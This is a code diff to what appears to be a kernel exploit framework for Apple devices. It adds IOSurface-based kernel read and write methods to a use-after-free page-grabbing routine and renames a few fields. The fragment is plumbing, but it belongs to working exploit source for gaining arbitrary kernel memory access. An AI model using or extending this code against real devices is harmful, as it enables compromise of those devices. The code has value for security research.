@@ -17,6 +17,7 @@
 
 #include "krkw/kread/kread_kqueue_workloop_ctl.h"
 #include "krkw/kread/kread_sem_open.h"
+#include "krkw/kread/kread_IOSurface.h"
 
 #define kwrite_from_method(type, method)                                       \
     do {                                                                       \
@@ -30,6 +31,7 @@
 
 #include "krkw/kwrite/kwrite_dup.h"
 #include "krkw/kwrite/kwrite_sem_open.h"
+#include "krkw/kwrite/kwrite_IOSurface.h"
 
 // Forward declarations for helper functions.
 void krkw_helper_init(struct kfd* kfd, struct krkw* krkw);
@@ -73,11 +75,13 @@ void krkw_init(struct kfd* kfd, u64 kread_method, u64 kwrite_method)
     switch (kread_method) {
         kread_method_case(kread_kqueue_workloop_ctl)
         kread_method_case(kread_sem_open)
+        kread_method_case(kread_IOSurface)
     }
 
     switch (kwrite_method) {
         kwrite_method_case(kwrite_dup)
         kwrite_method_case(kwrite_sem_open)
+        kwrite_method_case(kwrite_IOSurface)
     }
 
     krkw_helper_init(kfd, &kfd->kread);
@@ -89,12 +93,10 @@ void krkw_run(struct kfd* kfd)
     krkw_helper_grab_free_pages(kfd);
 
     timer_start();
-    
     krkw_helper_run_allocate(kfd, &kfd->kread);
     krkw_helper_run_allocate(kfd, &kfd->kwrite);
     krkw_helper_run_deallocate(kfd, &kfd->kread);
     krkw_helper_run_deallocate(kfd, &kfd->kwrite);
-     
     timer_end();
 }
 
@@ -137,7 +139,7 @@ void krkw_helper_grab_free_pages(struct kfd* kfd)
         u64 grabbed_puaf_pages = 0;
         for (u64 i = 0; i < kfd->puaf.number_of_puaf_pages; i++) {
             u64 puaf_page_uaddr = kfd->puaf.puaf_pages_uaddr[i];
-            if (!memcmp(info_copy_sentinel, (void*)(puaf_page_uaddr), info_copy_sentinel_size)) {
+            if (!memcmp(copy_sentinel, (void*)(puaf_page_uaddr), copy_sentinel_size)) {
                 if (++grabbed_puaf_pages == grabbed_puaf_pages_goal) {
                     print_u64(grabbed_free_pages);
                     timer_end();
@@ -206,12 +208,11 @@ loop_break:
         for (u64 i = 0; i < kfd->puaf.number_of_puaf_pages; i++) {
             u64 puaf_page_uaddr = kfd->puaf.puaf_pages_uaddr[i];
             print_buffer(puaf_page_uaddr, 64);
-            break;
         }
 
         assert_false(krkw_type);
     }
-
+    
     print_message(
         "%s ---> object_id = %llu, object_uaddr = 0x%016llx, object_size = %llu, allocated_id = %llu/%llu, batch_size = %llu",
         krkw_type,
@@ -225,7 +226,7 @@ loop_break:
 
     print_buffer(krkw->krkw_object_uaddr, krkw->krkw_object_size);
 
-    if (!kfd->info.kaddr.current_proc) {
+    if (!kfd->info.kernel.current_proc) {
         krkw->krkw_method_ops.find_proc(kfd);
     }
 }
